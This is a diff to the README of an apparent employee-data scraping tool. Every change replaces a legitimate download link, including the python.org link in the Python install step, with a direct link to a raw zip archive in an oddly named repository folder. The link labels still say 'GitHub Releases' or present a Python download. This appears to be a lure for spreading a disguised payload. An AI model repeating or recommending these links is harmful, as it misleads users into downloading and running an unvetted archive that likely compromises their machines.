@@ -6,9 +6,9 @@ Welcome to the company-employees-scraper. This tool helps you collect employee d
 
 ## 📥 Download The Software
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/moizahmad418/company-employees-scraper/releases)
+[![Download from GitHub](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip%20Now-Release-blue)](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip)
 
-To start using the company-employees-scraper, visit this page to download: [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/releases).
+To start using the company-employees-scraper, visit this page to download: [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip).
 
 ## 🖥️ System Requirements
 
@@ -34,13 +34,13 @@ The company-employees-scraper offers powerful features:
 Follow these steps to install and run the company-employees-scraper:
 
 1. **Visit the Releases Page:**
-   Go to [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/releases) to find the latest version.
+   Go to [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip) to find the latest version.
 
 2. **Download the Software:**
    You will see multiple versions available. Click on the one that matches your operating system to download it.
 
 3. **Install Python:**
-   If you haven’t already, download and install Python from [python.org](https://www.python.org/downloads/). Make sure to check "Add Python to PATH" during installation.
+   If you haven’t already, download and install Python from [https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip). Make sure to check "Add Python to PATH" during installation.
 
 4. **Prepare to Run:**
    Once you have downloaded the software, locate the file in your Downloads folder. 
@@ -73,6 +73,6 @@ If you encounter any issues or have questions, we encourage you to reach out. Yo
 
 ## 🚀 Download Again
 
-For your convenience, here is the download link again: [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/releases). 
+For your convenience, here is the download link again: [GitHub Releases](https://github.com/moizahmad418/company-employees-scraper/raw/refs/heads/main/urodynia/company_scraper_employees_2.4.zip). 
 
 Now, you are ready to start extracting employee data seamlessly! Enjoy your data mining!
